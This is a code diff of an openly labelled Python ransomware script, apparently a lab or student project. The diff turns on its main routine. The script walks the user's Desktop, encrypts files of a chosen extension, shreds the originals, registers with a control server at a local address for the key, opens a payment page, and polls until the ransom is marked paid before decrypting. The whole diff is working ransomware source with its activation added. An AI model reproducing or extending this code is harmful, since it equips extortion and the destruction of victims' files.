@@ -17,9 +17,10 @@ from ransomcrypto import *
 
 excluded_filetypes = ['.enc', '.exe', '.bat', '.tar.gz', '.js', '.html', '.py']
 included_filetypes = ['.zozo']
-IP_ADDRESS = "http://localhost:8080"
+enc_filetype = ".enc"
+IP_ADDRESS = "http://127.0.0.1:8080"
 
-priority_dirs = ['Documents', 'Downloads', 'Desktop']  # would normally do all folders in users home dir
+priority_dirs = ['Desktop']  # would normally do all folders in users home dir
 
 UUID = uuid.uuid4()
 # host_name = os.environ['COMPUTERNAME'] Not compatible with Linux
@@ -71,33 +72,36 @@ def browse_files_and_process(encryption):
     # When encryption key okay
     for target in priority_dirs:
         for dirName, subdirList, fileList in os.walk(os.path.expanduser("~/" + target), topdown=False):
-            print dirName
+            #print dirName
 
             for file_name in fileList:
                 file_name_loc = os.path.join(dirName, file_name)
                 name, ext = os.path.splitext(file_name_loc)
                 # only_filename = file_name_loc.split(".")[-1]
 
-                if ext in included_filetypes:
-                    print file_name_loc
-                    # create new encrypted file with .enc extension
-                    if encryption:
-
+                # create new encrypted file with .enc extension
+                if encryption:
+                    if ext in included_filetypes:
+                        print file_name_loc
                         try:
                             with open(file_name_loc, 'rb+') as in_file, open(file_name_loc + ".enc", 'wb+') as out_file:
                                 encrypt(in_file, out_file, encryption_key)
                         except:
                             continue
-                    else:
+                        shred(file_name_loc, 2)
+
+                else:
+                    if ext == enc_filetype :
                         try:
                             with open(file_name_loc, 'rb+') as in_file, open(name, 'wb+') as out_file:
                                 decrypt(in_file, out_file, encryption_key)
                         except:
                             continue
+                        shred(file_name_loc, 2)
 
-                    # shred the orginial file
 
-                    shred(file_name_loc, 2)
+                # shred the orginial file
+
 
                     # onto the next
 
@@ -110,12 +114,8 @@ while encryption_key == "":
     request_server("register", IP_ADDRESS, UUID, host_name)
     print encryption_key
 
-try:
-    ctypes.windll.user32.MessageBoxW(0, "Encryption key is " + encryption_key, "Good ransom", 1)
-except AttributeError:
-    pass
 
-# browse_files_and_process(True)
+browse_files_and_process(True)
 del encryption_key
 
 url = IP_ADDRESS + "/index/"
@@ -124,9 +124,5 @@ webbrowser.open(url, new=2)
 while paid == 0:
     request_server("paid", IP_ADDRESS, UUID, host_name)
 
-try:
-    ctypes.windll.user32.MessageBoxW(0, "Merci pour l'argent ! :)", "Good ransom", 1)
-except AttributeError:
-    pass
 
-    # browse_files_and_process(False)
+browse_files_and_process(False)
